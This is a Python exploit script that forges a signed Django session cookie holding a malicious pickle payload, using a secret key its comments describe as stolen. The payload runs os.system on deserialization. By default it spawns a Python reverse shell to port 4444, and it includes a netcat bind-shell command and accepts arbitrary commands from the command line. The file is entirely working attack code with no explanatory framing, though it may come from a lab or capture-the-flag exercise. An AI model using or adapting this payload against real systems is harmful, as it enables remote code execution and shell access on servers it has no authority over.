import pickle
import sys
import base64
import zlib
from django.core.signing import TimestampSigner 
from django.core.signing import Signer
from django.core import signing

COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
PYTHON_COMMAND = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''
CUSTOM_COMMAND = sys.argv[1] if len(sys.argv) > 1 else PYTHON_COMMAND

class RCE(object):
    def __reduce__(self):
        import os
        return(os.system, (CUSTOM_COMMAND,))
# zlib pickle.dumps if needed

#PAYLOAD = '"' + str(base64.b64encode(zlib.compress(pickle.dumps(RCE())))) + '"' #payload portion of the cookie
PAYLOAD = "." + str(base64.b64encode(zlib.compress(pickle.dumps(RCE())))) #payload portion of the cookie
print(TimestampSigner("x9ubs%m*mo41-+6sb#@_**jlimxs#!a$61%5u5336xt$8$vet-", salt="django.core.signing").sign(PAYLOAD)) #creates session cookie and signs using 'stolen' secret key
